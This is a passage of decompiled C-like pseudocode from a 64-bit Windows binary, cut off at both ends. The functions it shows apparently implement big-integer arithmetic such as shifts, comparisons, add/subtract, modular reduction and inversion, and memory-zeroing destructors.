  char v21; // [rsp+60h] [rbp+8h]

  v1 = a1;
  v2 = *(_QWORD *)(a1 + 16);
  v3 = *(unsigned __int64 **)(a1 + 24);
  if ( *(_DWORD *)(a1 + 32) == 1 )
  {
    v4 = *v3;
    v5 = *v3 + 1;
    *v3 = v5;
    if ( v5 < v4 )
    {
      v6 = 1;
      if ( v2 <= 1 )
      {
LABEL_7:
        sub_1400458E0(v1 + 8, 2i64 * *(_QWORD *)(v1 + 16));
        *(_QWORD *)(*(_QWORD *)(v1 + 24) + 8i64 * (*(_QWORD *)(v1 + 16) >> 1)) = 1i64;
      }
      else
      {
        v7 = 1i64;
        while ( 1 )
        {
          v8 = v3[v7]++ == -1i64;
          if ( !v8 )
            break;
          v7 = ++v6;
          if ( v6 >= v2 )
            goto LABEL_7;
        }
      }
    }
  }
  else
  {
    v9 = *v3;
    v10 = *v3 - 1;
    *v3 = v10;
    if ( v10 > v9 )
    {
      v11 = 1;
      if ( v2 <= 1 )
      {
LABEL_13:
        v14 = sub_14004B3C0(&v21);
        v15 = sub_14003D010(v14, (__int64)&v18);
        sub_14003C670(v1, v15);
        v16 = Memory;
        memset(Memory, 0, 8 * v19);
        free(v16);
      }
      else
      {
        v12 = 1i64;
        while ( 1 )
        {
          v13 = v3[v12];
          v3[v12] = v13 - 1;
          if ( v13 )
            break;
          v12 = ++v11;
          if ( v11 >= v2 )
            goto LABEL_13;
        }
      }
    }
  }
  return v1;
}
// 14004B3C0: using guessed type __int64 __fastcall sub_14004B3C0(_QWORD);

//----- (000000014003D010) ----------------------------------------------------
__int64 __fastcall sub_14003D010(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  int v3; // edx
  _QWORD *v4; // rcx
  __int64 v5; // rax
  _QWORD *v6; // rcx

  v2 = a2;
  sub_14003C000(a2, a1);
  v3 = *(_DWORD *)(v2 + 32);
  if ( v3 == 1 )
    goto LABEL_12;
  v4 = *(_QWORD **)(v2 + 24);
  if ( *v4 )
    goto LABEL_12;
  v5 = *(_QWORD *)(v2 + 16);
  if ( v5 )
  {
    v6 = &v4[v5 - 1];
    do
    {
      if ( *v6 )
        break;
      --v6;
      --v5;
    }
    while ( v5 );
  }
  if ( (_DWORD)v5 )
LABEL_12:
    *(_DWORD *)(v2 + 32) = 1 - v3;
  return v2;
}

//----- (000000014003D080) ----------------------------------------------------
void **__fastcall sub_14003D080(void **a1, const void **a2, int a3)
{
  int v3; // ebx
  void **v4; // rdi
  const void **v5; // rax
  void *v7; // [rsp+30h] [rbp-28h]

  v3 = a3;
  v4 = a1;
  sub_14003B980(&v7, a2);
  v5 = (const void **)sub_14003D490(&v7, v3);
  sub_14003B980(v4, v5);
  if ( v7 )
    operator delete(v7);
  return v4;
}

//----- (000000014003D0F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_14003D0F0(__int64 *a1, unsigned __int64 a2)
{
  __int64 v2; // rax
  unsigned int v3; // esi
  unsigned __int64 v5; // rdi
  unsigned int v6; // ebx
  __int64 v7; // [rsp+20h] [rbp-18h]
  __int64 v8; // [rsp+28h] [rbp-10h]

  v2 = *a1;
  v3 = a2;
  if ( !a2 )
    return (unsigned int)a1[1] | ((unsigned __int64)a1[1] >> 32 << 32);
  v8 = a1[1];
  v7 = v2;
  v5 = a2 >> 32;
  v6 = sub_14003AC00((unsigned int *)&v7 + 1, a2, HIDWORD(a2));
  return (unsigned int)sub_14003AC00((unsigned int *)&v7, v3, v5) | ((unsigned __int64)v6 << 32);
}

//----- (000000014003D190) ----------------------------------------------------
unsigned __int64 __fastcall sub_14003D190(__int64 *a1, unsigned __int64 a2)
{
  unsigned int v2; // edi
  unsigned __int64 v3; // rax
  __int64 v5; // rcx
  unsigned __int64 v6; // rbx
  __int64 v7; // [rsp+20h] [rbp-18h]
  unsigned __int64 v8; // [rsp+28h] [rbp-10h]

  v2 = a2;
  v3 = a1[1];
  if ( a2 < 0x100000000i64 )
    return (*(unsigned int *)a1
          + ((((unsigned __int64)*a1 >> 32) + (v3 % (unsigned int)a2 << 32)) % (unsigned int)a2 << 32))
         % (unsigned int)a2;
  v5 = *a1;
  if ( a2 )
  {
    v7 = v5;
    v8 = v3;
    v6 = a2 >> 32;
    sub_14003AC00((unsigned int *)&v7 + 1, a2, HIDWORD(a2));
    sub_14003AC00((unsigned int *)&v7, v2, v6);
  }
  return v7;
}

//----- (000000014003D250) ----------------------------------------------------
bool __fastcall sub_14003D250(__int64 a1, __int64 a2)
{
  bool result; // al

  if ( *(_DWORD *)(a1 + 32) == 1 )
  {
    if ( *(_DWORD *)(a2 + 32) == 1 )
      result = -(signed int)sub_14004A0B0(a1, a2) < 0;
    else
      result = 1;
  }
  else if ( *(_DWORD *)(a2 + 32) == 1 )
  {
    result = 0;
  }
  else
  {
    result = (signed int)sub_14004A0B0(a1, a2) < 0;
  }
  return result;
}

//----- (000000014003D2B0) ----------------------------------------------------
bool __fastcall sub_14003D2B0(__int64 a1, __int64 a2)
{
  bool result; // al
  int v3; // eax

  if ( *(_DWORD *)(a1 + 32) == 1 )
  {
    if ( *(_DWORD *)(a2 + 32) == 1 )
    {
      v3 = sub_14004A0B0(a1, a2);
      result = -v3 >= 0 && v3 != 0;
    }
    else
    {
      result = 0;
    }
  }
  else if ( *(_DWORD *)(a2 + 32) == 1 )
  {
    result = 1;
  }
  else
  {
    result = (signed int)sub_14004A0B0(a1, a2) > 0;
  }
  return result;
}

//----- (000000014003D310) ----------------------------------------------------
_QWORD *sub_14003D310()
{
  __int64 v0; // rcx
  _QWORD *v1; // rbx
  _QWORD *v2; // rax

  v1 = operator new(0x28ui64);
  if ( !v1 )
    return 0i64;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(v0);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *v1 = &off_1400A9910;
  v1[2] = 2i64;
  v2 = sub_14003A000(0x10ui64);
  v1[3] = v2;
  *((_DWORD *)v1 + 8) = 0;
  *v2 = 1i64;
  *(_QWORD *)(v1[3] + 8i64) = 0i64;
  return v1;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003D3A0) ----------------------------------------------------
_QWORD *sub_14003D3A0()
{
  __int64 v0; // rcx
  _QWORD *v1; // rbx
  _QWORD *v2; // rax

  v1 = operator new(0x28ui64);
  if ( !v1 )
    return 0i64;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(v0);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *v1 = &off_1400A9910;
  v1[2] = 2i64;
  v2 = sub_14003A000(0x10ui64);
  v1[3] = v2;
  *((_DWORD *)v1 + 8) = 0;
  *v2 = 2i64;
  *(_QWORD *)(v1[3] + 8i64) = 0i64;
  return v1;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (000000014003D430) ----------------------------------------------------
__int64 __fastcall sub_14003D430(__int64 a1)
{
  __int64 v1; // rdi
  __int64 v2; // rax
  __int64 v3; // rbx
  void *v4; // rdx
  char v6; // [rsp+28h] [rbp-30h]
  __int64 v7; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v1 = a1;
  v2 = sub_14004C040(a1, &v6);
  v3 = sub_14003C670(v1, v2);
  v4 = Memory;
  memset(Memory, 0, 8 * v7);
  free(v4);
  return v3;
}
// 14004C040: using guessed type __int64 __fastcall sub_14004C040(_QWORD, _QWORD);

//----- (000000014003D490) ----------------------------------------------------
_QWORD *__fastcall sub_14003D490(_QWORD *a1, int a2)
{
  unsigned __int64 v2; // rax
  _QWORD *v3; // rbx
  int v4; // edi
  signed __int64 v5; // rdi
  _DWORD *v6; // rdx
  _QWORD *result; // rax
  int *v8; // rax
  int v9; // [rsp+38h] [rbp+10h]

  v9 = a2;
  v2 = a1[1];
  v3 = a1;
  v4 = a2;
  if ( (unsigned __int64)&v9 >= v2 || *a1 > (unsigned __int64)&v9 )
  {
    if ( v2 == a1[2] )
      sub_14004C440(a1, 1ui64);
    v8 = (int *)v3[1];
    if ( v8 )
      *v8 = v4;
  }
  else
  {
    v5 = ((signed __int64)&v9 - *a1) >> 2;
    if ( v2 == a1[2] )
      sub_14004C440(a1, 1ui64);
    v6 = (_DWORD *)v3[1];
    if ( v6 )
    {
      result = v3;
      *v6 = *(_DWORD *)(*v3 + 4 * v5);
      v3[1] += 4i64;
      return result;
    }
  }
  v3[1] += 4i64;
  return v3;
}

//----- (000000014003D540) ----------------------------------------------------
__int64 __fastcall sub_14003D540(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 v4; // r8
  __int64 v5; // rdx

  v2 = a2;
  v3 = a1;
  sub_1400458E0(a1 + 8, *(_QWORD *)(a2 + 16));
  if ( *(_DWORD *)(v3 + 32) != 1 )
  {
    v4 = v2;
    v5 = v3;
    if ( *(_DWORD *)(v2 + 32) != 1 )
    {
      sub_140049F00(v3, v3, v2);
      return v3;
    }
    goto LABEL_6;
  }
  if ( *(_DWORD *)(v2 + 32) != 1 )
  {
    v4 = v3;
    v5 = v2;
LABEL_6:
    sub_14004A490(v3, v5, v4);
    return v3;
  }
  sub_140049F00(v3, v3, v2);
  *(_DWORD *)(v3 + 32) = 1;
  return v3;
}

//----- (000000014003D5D0) ----------------------------------------------------
__int64 __fastcall sub_14003D5D0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 v4; // r8
  __int64 v5; // rdx

  v2 = a2;
  v3 = a1;
  sub_1400458E0(a1 + 8, *(_QWORD *)(a2 + 16));
  if ( *(_DWORD *)(v3 + 32) == 1 )
  {
    if ( *(_DWORD *)(v2 + 32) != 1 )
    {
      sub_140049F00(v3, v3, v2);
      *(_DWORD *)(v3 + 32) = 1;
      return v3;
    }
    v4 = v3;
    v5 = v2;
  }
  else
  {
    v4 = v2;
    v5 = v3;
    if ( *(_DWORD *)(v2 + 32) == 1 )
    {
      sub_140049F00(v3, v3, v2);
      return v3;
    }
  }
  sub_14004A490(v3, v5, v4);
  return v3;
}

//----- (000000014003D660) ----------------------------------------------------
__int64 __fastcall sub_14003D660(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rbx
  __int64 *v3; // rcx
  __int64 v4; // rax
  __int64 *v5; // r8
  unsigned __int64 v6; // rdi
  unsigned __int64 v7; // rbp
  int v8; // esi
  __int64 v9; // r9
  __int64 v10; // rdi
  unsigned __int64 *v11; // r8
  unsigned __int64 v12; // rdx
  unsigned __int64 v13; // rax
  __int64 v14; // rax
  _QWORD *v15; // rcx
  __int64 v16; // rax
  char v18; // [rsp+30h] [rbp+8h]

  v2 = a1;
  v3 = *(__int64 **)(a1 + 24);
  v4 = *(_QWORD *)(v2 + 16);
  if ( v4 )
  {
    v5 = &v3[v4 - 1];
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = (unsigned int)v4;
  v7 = a2 >> 6;
  v8 = a2 & 0x3F;
  sub_14004B770(v3, (unsigned int)v4, a2 >> 6);
  if ( v6 > v7 )
  {
    v9 = 0i64;
    if ( v8 )
    {
      v10 = v6 - v7;
      if ( v10 )
      {
        v11 = (unsigned __int64 *)(*(_QWORD *)(v2 + 24) - 8i64 + 8 * v10);
        do
        {
          v12 = *v11;
          --v11;
          v13 = v9 | (v12 >> v8);
          v9 = v12 << (64 - (unsigned __int8)v8);
          v11[1] = v13;
          --v10;
        }
        while ( v10 );
      }
    }
  }
  if ( *(_DWORD *)(v2 + 32) == 1 )
  {
    v14 = *(_QWORD *)(v2 + 16);
    if ( v14 )
    {
      v15 = (_QWORD *)(*(_QWORD *)(v2 + 24) + 8 * v14 - 8);
      do
      {
        if ( *v15 )
          break;
        --v15;
        --v14;
      }
      while ( v14 );
    }
    if ( !(_DWORD)v14 )
    {
      v16 = sub_14004B4E0(&v18);
      sub_14003C670(v2, v16);
    }
  }
  return v2;
}
// 14004B4E0: using guessed type __int64 __fastcall sub_14004B4E0(_QWORD);

//----- (000000014003D760) ----------------------------------------------------
__int64 __fastcall sub_14003D760(__int64 a1, unsigned __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rcx
  __int64 v4; // rax
  _QWORD *v5; // r8
  __int64 v6; // rbp
  unsigned __int64 v7; // rbx
  char v8; // si
  signed __int64 v9; // rax
  unsigned __int64 v10; // r9
  signed __int64 v11; // rbx
  unsigned int v12; // esi
  unsigned __int64 v13; // r8
  unsigned __int64 v14; // r11
  unsigned __int64 v15; // rdx

  v2 = a1;
  v3 = *(_QWORD *)(a1 + 24);
  v4 = *(_QWORD *)(v2 + 16);
  if ( v4 )
  {
    v5 = (_QWORD *)(v3 - 8 + 8 * v4);
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = (unsigned int)v4;
  v7 = a2 >> 6;
  v8 = a2;
  v9 = sub_14004B580((unsigned int)v4 + ((a2 + 63) >> 6));
  sub_1400458E0(v2 + 8, v9);
  sub_14004B6F0(*(char **)(v2 + 24), v7 + v6, v7);
  v10 = 0i64;
  v11 = *(_QWORD *)(v2 + 24) + 8 * v7;
  v12 = v8 & 0x3F;
  if ( v12 )
  {
    v13 = 0i64;
    v14 = v6 + (((unsigned __int64)v12 + 63) >> 6);
    if ( v14 )
    {
      do
      {
        v15 = *(_QWORD *)(v11 + 8 * v13++);
        *(_QWORD *)(v11 + 8 * v13 - 8) = v10 | (v15 << v12);
        v10 = v15 >> (64 - (unsigned __int8)v12);
      }
      while ( v13 < v14 );
    }
  }
  return v2;
}

//----- (000000014003D850) ----------------------------------------------------
void *__fastcall sub_14003D850(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rsi
  void *v4; // r8
  void *v5; // rdx

  v2 = a2;
  v3 = a1;
  v4 = (void *)*((_QWORD *)a1 + 11);
  memset(*((void **)a1 + 11), 0, 8i64 * *((_QWORD *)a1 + 10));
  free(v4);
  v5 = (void *)*((_QWORD *)v3 + 6);
  memset(*((void **)v3 + 6), 0, 8i64 * *((_QWORD *)v3 + 5));
  free(v5);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014003D8D0) ----------------------------------------------------
_QWORD *__fastcall sub_14003D8D0(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rsi
  void *v4; // r8

  v2 = a2;
  v3 = a1;
  v4 = (void *)*((_QWORD *)a1 + 7);
  memset(*((void **)a1 + 7), 0, 8i64 * *((_QWORD *)a1 + 6));
  free(v4);
  sub_140024220(v3);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014003D940) ----------------------------------------------------
void *__fastcall sub_14003D940(void *a1, char a2)
{
  void *v2; // r8
  void *v3; // rsi
  char v4; // bl

  v2 = (void *)*((_QWORD *)a1 + 4);
  v3 = a1;
  v4 = a2;
  memset(v2, 0, *((_QWORD *)a1 + 3));
  free(v2);
  if ( v4 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014003D990) ----------------------------------------------------
_QWORD *__fastcall sub_14003D990(void *a1, char a2)
{
  char *v2; // rax
  _QWORD *v3; // rbx
  char *v4; // rdi
  __int64 v5; // rcx
  _DWORD *v6; // rdi
  __int64 v7; // rcx

  v2 = (char *)a1 + 104;
  v3 = a1;
  v4 = (char *)*((_QWORD *)a1 + 23);
  v5 = *((_QWORD *)a1 + 22);
  if ( v4 == v2 )
  {
    v2[65] = 0;
    while ( v5 )
    {
      *(_DWORD *)v4 = 0;
      v4 += 4;
      --v5;
    }
  }
  v6 = (_DWORD *)v3[12];
  v7 = v3[11];
  if ( v6 == (_DWORD *)(v3 + 2) )
  {
    *((_BYTE *)v3 + 81) = 0;
    while ( v7 )
    {
      *v6 = 0;
      ++v6;
      --v7;
    }
  }
  if ( a2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014003D9F0) ----------------------------------------------------
void *__fastcall sub_14003D9F0(void *a1, char a2)
{
  void *v2; // r8
  void *v3; // rsi
  char v4; // bl

  v2 = (void *)*((_QWORD *)a1 + 3);
  v3 = a1;
  v4 = a2;
  memset(v2, 0, 8i64 * *((_QWORD *)a1 + 2));
  free(v2);
  if ( v4 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014003DA40) ----------------------------------------------------
__int64 __fastcall sub_14003DA40(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  sub_14003C000(a2, a1);
  *(_DWORD *)(v2 + 32) = 0;
  return v2;
}

//----- (000000014003DA70) ----------------------------------------------------
__int64 __fastcall sub_14003DA70(__int64 a1, __int64 a2, __int64 a3)
{
  return sub_14003D540(a2, a3);
}

//----- (000000014003DA80) ----------------------------------------------------
__int64 __fastcall sub_14003DA80(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rcx
  __int64 v5; // rbx
  __int64 v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rdx
  signed __int64 v9; // rax
  __int64 v10; // r9
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // r8
  __int64 v14; // rdi
  int v15; // eax
  __int64 v16; // r8
  __int64 v17; // rdx

  v3 = a1;
  v4 = *(_QWORD *)(a2 + 16);
  v5 = a2;
  v6 = *(_QWORD *)(v3 + 40);
  if ( v4 != v6 || *(_QWORD *)(a3 + 16) != v6 )
  {
    sub_14003D540(a2, a3);
    v14 = v3 + 24;
    if ( *(_DWORD *)(v5 + 32) == 1 )
    {
      if ( *(_DWORD *)(v14 + 32) != 1 )
        return v5;
      v15 = -(signed int)sub_14004A0B0(v5, v14);
    }
    else
    {
      if ( *(_DWORD *)(v14 + 32) == 1 )
      {
LABEL_16:
        sub_1400458E0(v5 + 8, *(_QWORD *)(v14 + 16));
        if ( *(_DWORD *)(v5 + 32) == 1 )
        {
          if ( *(_DWORD *)(v14 + 32) != 1 )
          {
            sub_140049F00(v5, v5, v14);
            *(_DWORD *)(v5 + 32) = 1;
            return v5;
          }
          v16 = v5;
          v17 = v14;
        }
        else
        {
          v16 = v14;
          v17 = v5;
          if ( *(_DWORD *)(v14 + 32) == 1 )
          {
            sub_140049F00(v5, v5, v14);
            return v5;
          }
        }
        sub_14004A490(v5, v17, v16);
        return v5;
      }
      v15 = sub_14004A0B0(v5, v14);
    }
    if ( v15 >= 0 )
      goto LABEL_16;
    return v5;
  }
  if ( !(unsigned int)sub_140062F10(v4, *(_QWORD *)(a2 + 24), *(_QWORD *)(a2 + 24), *(_QWORD *)(a3 + 24)) )
  {
    v7 = *(_QWORD *)(v5 + 16);
    v8 = *(_QWORD *)(v3 + 48);
    if ( v7 )
    {
      v9 = v8 + 8 * v7;
      v10 = *(_QWORD *)(v5 + 24) - v8;
      do
      {
        v11 = *(_QWORD *)(v10 + v9 - 8);
        v12 = *(_QWORD *)(v9 - 8);
        v9 -= 8i64;
        --v7;
        if ( v11 > v12 )
          break;
        if ( v11 < v12 )
          return v5;
      }
      while ( v7 );
    }
  }
  sub_140062F60(*(_QWORD *)(v5 + 16), *(_QWORD *)(v5 + 24), *(_QWORD *)(v5 + 24), *(_QWORD *)(v3 + 48));
  return v5;
}

//----- (000000014003DBD0) ----------------------------------------------------
__int64 __fastcall sub_14003DBD0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v2 = a1;
  v3 = sub_140024740((__int64)&v7, a2);
  v4 = sub_14003C670(v2 + 64, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v4;
}

//----- (000000014003DC30) ----------------------------------------------------
signed __int64 __fastcall sub_14003DC30(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rsi
  __int64 v5; // rcx
  __int64 v6; // rax
  __int64 v7; // rdx
  __int64 v8; // rcx
  unsigned __int64 *v9; // rax
  __int64 v10; // r8
  unsigned __int64 v11; // rdx
  __int64 v13; // rax
  void *v14; // rdx
  int v15; // eax
  __int64 v16; // rcx
  __int64 v17; // r8
  __int64 v18; // rdx
  char v19; // [rsp+28h] [rbp-30h]
  __int64 v20; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v3 = a2;
  v4 = a1;
  v5 = *(_QWORD *)(a2 + 16);
  v6 = *(_QWORD *)(v4 + 40);
  if ( v5 != v6 || *(_QWORD *)(a3 + 16) != v6 )
  {
    v13 = sub_140024740((__int64)&v19, a2);
    sub_14003C670(v4 + 104, v13);
    v14 = Memory;
    memset(Memory, 0, 8 * v20);
    free(v14);
    if ( *(_DWORD *)(v4 + 136) == 1 )
    {
      if ( *(_DWORD *)(v4 + 56) != 1 )
        return v4 + 104;
      v15 = -(signed int)sub_14004A0B0(v4 + 104, v4 + 24);
    }
    else
    {
      if ( *(_DWORD *)(v4 + 56) == 1 )
        goto LABEL_17;
      v15 = sub_14004A0B0(v4 + 104, v4 + 24);
    }
    if ( v15 >= 0 )
    {
LABEL_17:
      sub_1400458E0(v4 + 112, *(_QWORD *)(v4 + 40));
      v16 = v4 + 104;
      if ( *(_DWORD *)(v4 + 136) == 1 )
      {
        if ( *(_DWORD *)(v4 + 56) != 1 )
        {
          sub_140049F00(v16, v4 + 104, v4 + 24);
          *(_DWORD *)(v4 + 136) = 1;
          return v4 + 104;
        }
        v17 = v4 + 104;
        v18 = v4 + 24;
      }
      else
      {
        v17 = v4 + 24;
        v18 = v4 + 104;
        if ( *(_DWORD *)(v4 + 56) == 1 )
        {
          sub_140049F00(v16, v18, v17);
          return v4 + 104;
        }
      }
      sub_14004A490(v16, v18, v17);
    }
    return v4 + 104;
  }
  if ( !(unsigned int)sub_140062F10(v5, *(_QWORD *)(v4 + 88), *(_QWORD *)(a2 + 24), *(_QWORD *)(a3 + 24)) )
  {
    v7 = *(_QWORD *)(v4 + 48);
    v8 = *(_QWORD *)(v3 + 16);
    if ( v8 )
    {
      v9 = (unsigned __int64 *)(v7 + 8 * v8);
      v10 = *(_QWORD *)(v4 + 88) - v7;
      do
      {
        --v8;
        --v9;
        v11 = *(unsigned __int64 *)((char *)v9 + v10);
        if ( v11 > *v9 )
          break;
        if ( v11 < *v9 )
          return v4 + 64;
      }
      while ( v8 );
    }
  }
  sub_140062F60(*(_QWORD *)(v3 + 16), *(_QWORD *)(v4 + 88), *(_QWORD *)(v4 + 88), *(_QWORD *)(v4 + 48));
  return v4 + 64;
}

//----- (000000014003DDA0) ----------------------------------------------------
_QWORD *__fastcall sub_14003DDA0(__int64 a1, _QWORD *a2)
{
  size_t v2; // rbx
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = sub_140048460(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (000000014003DE60) ----------------------------------------------------
__int64 __fastcall sub_14003DE60(char *a1, char *a2, char *a3, __int64 a4, char *Src, __int64 a6)
{
  char *v6; // r12
  unsigned __int64 v7; // rsi
  rsize_t v8; // r13
  char *v9; // r10
  char *v10; // r15
  char *v11; // r14
  unsigned __int64 v12; // rbx
  char *v13; // rax
  unsigned int v14; // ebp
  unsigned __int64 v15; // rax
  __int64 *v16; // rax
  unsigned __int64 v17; // r8
  unsigned __int64 v18; // rdx
  char *v19; // rax
  __int64 v20; // rcx
  __int64 *v21; // rax
  unsigned __int64 v22; // rcx
  signed __int64 v23; // rdx
  unsigned __int64 v24; // rdi
  __int64 v25; // rax
  __int64 v26; // r9
  signed __int64 v27; // rcx
  char *v28; // rax
  __int64 v29; // r8
  unsigned __int64 v30; // r10
  unsigned __int64 *v31; // rdi
  unsigned __int64 v32; // rdx
  unsigned __int64 v33; // rax
  unsigned __int64 v34; // rdi
  unsigned __int64 v35; // r8
  unsigned __int64 v36; // rdx
  unsigned __int64 v37; // rcx
  __int64 v38; // rsi
  signed __int64 v39; // rax
  unsigned __int64 v40; // rdx
  unsigned __int64 v41; // rdi
  signed int v42; // eax
  bool v43; // zf
  signed __int64 v44; // rax
  signed __int64 v45; // rax
  BOOL v46; // eax
  unsigned __int64 v48; // [rsp+20h] [rbp-48h]
  unsigned __int64 v49; // [rsp+28h] [rbp-40h]
  char *Dst; // [rsp+70h] [rbp+8h]
  char v51; // [rsp+78h] [rbp+10h]
  __int64 v52; // [rsp+80h] [rbp+18h]

  Dst = a1;
  v6 = a2;
  v7 = 2i64;
  v8 = 8 * a6;
  v9 = &a2[24 * a6];
  v10 = &a2[8 * a6];
  v11 = &a2[16 * a6];
  v52 = (__int64)&a2[24 * a6];
  v12 = a6;
  if ( a6 )
  {
    v13 = &Src[v8 - 8];
    do
    {
      if ( *((_QWORD *)v13 - 1) )
        break;
      if ( *(_QWORD *)v13 )
        break;
      v13 -= 16;
      v12 -= 2i64;
    }
    while ( v12 );
  }
  v14 = 0;
  v51 = 0;
  if ( 3 * a6 )
    memset(a2, 0, 24 * a6);
  *(_QWORD *)a2 = 1i64;
  if ( v11 != a3 )
  {
    memcpy_s(v11, 8 * a4, a3, 8 * a4);
    v9 = (char *)v52;
  }
  if ( v9 != Src )
    memcpy_s(v9, v8, Src, v8);
  while ( 1 )
  {
    v15 = *(_QWORD *)v11;
    if ( !*(_QWORD *)v11 )
      break;
LABEL_31:
    _BitScanForward64((unsigned __int64 *)&v26, v15);
    v14 += v26;
    if ( v15 >> v26 == 1 && !*((_QWORD *)v11 + 1) )
    {
      v27 = v12 - 2;
      if ( v12 == 2 )
      {
LABEL_38:
        if ( v51 )
        {
          sub_140062F60(a6, (__int64)Dst, (__int64)Src, (__int64)v6);
        }
        else if ( Dst != v6 )
        {
          memcpy_s(Dst, v8, v6, v8);
        }
        return v14;
      }
      v28 = &v11[8 * (v27 + 1)];
      while ( !*((_QWORD *)v28 - 1) && !*(_QWORD *)v28 )
      {
        v28 -= 16;
        v27 -= 2i64;
        if ( !v27 )
          goto LABEL_38;
      }
    }
    v29 = 0i64;
    if ( (_DWORD)v26 )
    {
      v30 = v12;
      if ( v12 )
      {
        v31 = (unsigned __int64 *)&v11[8 * (v12 - 1)];
        do
        {
          v32 = *v31;
          --v31;
          v33 = v29 | (v32 >> v26);
          v29 = v32 << (64 - (unsigned __int8)v26);
          v31[1] = v33;
          --v30;
        }
        while ( v30 );
      }
    }
    v34 = 0i64;
    if ( (_DWORD)v26 )
    {
      v35 = 0i64;
      if ( v7 )
      {
        do
        {
          v36 = *(_QWORD *)&v10[8 * v35++];
          *(_QWORD *)&v10[8 * v35 - 8] = v34 | (v36 << v26);
          v34 = v36 >> (64 - (unsigned __int8)v26);
        }
        while ( v35 < v7 );
      }
    }
    *(_QWORD *)&v10[8 * v7] += v34;
    v37 = v12;
    v38 = 2 * (v34 != 0) + v7;
    if ( v12 )
    {
      v39 = (signed __int64)&v11[8 * v12];
      while ( 1 )
      {
        v40 = *(_QWORD *)(v39 - 8);
        v41 = *(_QWORD *)(v52 - (_QWORD)v11 + v39 - 8);
        v39 -= 8i64;
        --v37;
        if ( v40 > v41 )
          break;
        if ( v40 < v41 )
        {
          v42 = -1;
          goto LABEL_53;
        }
        if ( !v37 )
          goto LABEL_52;
      }
      v42 = 1;
    }
    else
    {
LABEL_52:
      v42 = 0;
    }
LABEL_53:
    v43 = v42 == -1;
    v51 ^= v43;
    v44 = 8 * v43 * ((signed __int64)&v11[-v52] >> 3);
    v11 -= v44;
    v52 += v44;
    v45 = 8 * v43 * ((v6 - v10) >> 3);
    v6 -= v45;
    v10 += v45;
    v12 -= 2 * (*(_OWORD *)&v11[8 * v12 - 16] == 0i64);
    sub_140062F60(v12, (__int64)v11, (__int64)v11, v52);
    v46 = sub_140062F10(v38, (__int64)v6, (__int64)v6, (__int64)v10);
    *(_QWORD *)&v6[8 * v38] += v46;
    v7 = v38 + 2i64 * v46;
  }
  while ( sub_140047170((__int64)v11, v12) )
  {
    v16 = (__int64 *)&v48;
    if ( v12 >= 1 )
      v16 = (__int64 *)&v49;
    v49 = 1i64;
    v48 = v12;
    v17 = *v16;
    if ( *v16 )
    {
      if ( v17 < v12 )
      {
        v18 = *v16;
        v19 = v11;
        do
        {
          v20 = *(_QWORD *)&v19[8 * v17];
          ++v18;
          v19 += 8;
          *((_QWORD *)v19 - 1) = v20;
        }
        while ( v18 < v12 );
      }
      if ( v17 )
        memset(&v11[8 * (v12 - v17)], 0, 8 * v17);
    }
    v48 = 1i64;
    v7 += 2 * (*(_QWORD *)&v10[8 * v7 - 8] != 0i64);
    v21 = (__int64 *)&v49;
    v49 = v7;
    if ( v7 >= 1 )
